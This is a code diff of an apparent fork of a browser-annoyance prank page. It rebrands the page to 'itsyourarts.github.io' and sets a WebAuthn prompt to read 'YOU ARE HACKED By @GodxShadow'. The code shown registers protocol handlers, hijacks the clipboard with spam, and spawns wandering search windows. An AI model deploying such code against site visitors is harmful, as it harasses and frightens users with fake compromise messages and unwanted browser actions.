@@ -375,7 +375,7 @@ function registerProtocolHandlers () {
   const handlerUrl = window.location.href + '/url=%s'
 
   protocolWhitelist.forEach(proto => {
-    navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
+    navigator.registerProtocolHandler(proto, handlerUrl, 'itsyourarts.github.io')
   })
 }
 
@@ -718,8 +718,8 @@ function requestWebauthnAttestation () {
         // User:
         user: {
           id: new Uint8Array(16),
-          name: 'YOU_ARE_HACKED@THEANNOYINGSITE.COM',
-          displayName: 'YOU ARE HACKED'
+          name: 'YOU_ARE_HACKED_BY_@GODxSHADOW',
+          displayName: 'YOU ARE HACKED By @GodxShadow'
         },
 
         pubKeyCredParams: [{
@@ -923,7 +923,7 @@ function rainbowThemeColor () {
  * Copy cat pictures onto the user's clipboard. Requires user-initiated event.
  */
 function copySpamToClipboard () {
-  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://theannoyingsite.com'
+  const randomArt = getRandomArrayEntry(ART) + '\nCheck out https://itsyourarts.github.io'
   clipboardCopy(randomArt)
 }
 
@@ -1129,7 +1129,7 @@ function setupSearchWindow (win) {
   const { x, y } = getRandomCoords()
   win.moveTo(x, y)
   win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
-  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
+  win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[0])
   let searchIndex = 1
   const interval = setInterval(() => {
     if (win.closed) {
@@ -1146,7 +1146,7 @@ function setupSearchWindow (win) {
       const { x, y } = getRandomCoords()
       win.moveTo(x, y)
       win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
-      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
+      win.window.location = 'https://www.google.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])
 
       searchIndex += 1
       if (searchIndex >= SEARCHES.length) {
